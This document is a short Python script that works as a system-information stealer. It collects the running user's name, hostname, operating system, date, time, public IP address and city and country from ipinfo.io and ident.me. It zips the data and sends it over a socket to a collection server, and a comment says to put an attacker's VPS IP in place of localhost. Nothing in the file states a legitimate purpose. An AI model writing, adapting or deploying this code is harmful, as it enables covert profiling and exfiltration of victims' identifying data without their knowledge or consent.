import zipfile
import os
import shutil
import socket
import json
import urllib.request as r  
import re
import json
from urllib.request import urlopen
import datetime
import getpass
import platform
from datetime import datetime
import secrets
import string
import time

user = getpass.getuser()
C_USER = user

newpath = C_USER 
if not os.path.exists(newpath):
    os.makedirs(newpath)

url = 'http://ipinfo.io/json'
IP_ADD = (r.urlopen("https://v4.ident.me").read().decode('utf8'))  
hostname = socket.gethostname()
Computer_User = getpass.getuser()
User_ID = getpass.getuser()
OS = platform.system()
response = urlopen(url)
data = json.load(response)
City = data['city']
Country =data['country']
CurrentTime = (datetime.now().strftime("%H:%M:%S"))
Unique_ID = (''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase)for i in range(16)))
Date = (datetime.today().strftime('%Y-%m-%d'))
import datetime
intDay=(int(datetime.datetime.today().strftime('%w')))
days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday",]
Day = (days [intDay])

with open("Info.txt", "w") as f:
    f.write(hostname + os.linesep + 
            Computer_User + os.linesep +
            OS + os.linesep +
            Date + ',' + Day + os.linesep +
            CurrentTime + os.linesep +
            IP_ADD + os.linesep +
            City + ',' + Country + os.linesep +
            Unique_ID + os.linesep)

os.rename("Info.txt", C_USER + "/Info.txt")

folder_to_be_zipped = C_USER
with zipfile.ZipFile(C_USER + '.zip', 'w', zipfile.ZIP_DEFLATED) as newzip:
    for dirpath, dirnames, files in os.walk(folder_to_be_zipped):
        for file in files:
            newzip.write(os.path.join(dirpath, file))
os.rename (C_USER, user)
shutil.rmtree(C_USER) #delete folder called user_name

def transmit(sock, filename, author, content):
    msg = {'filename': filename, 'author': author, 'length': len(content)}
    data = json.dumps(msg, ensure_ascii=False).encode() + b'\r\n' + content
    sock.sendall(data)

client = socket.socket()
client.connect(('localhost',5000)) # put the VPS IP here
with client:
    with open(C_USER + '.zip','rb') as f:
        content = f.read()
    transmit(client, C_USER + '.zip', 'marc', content)
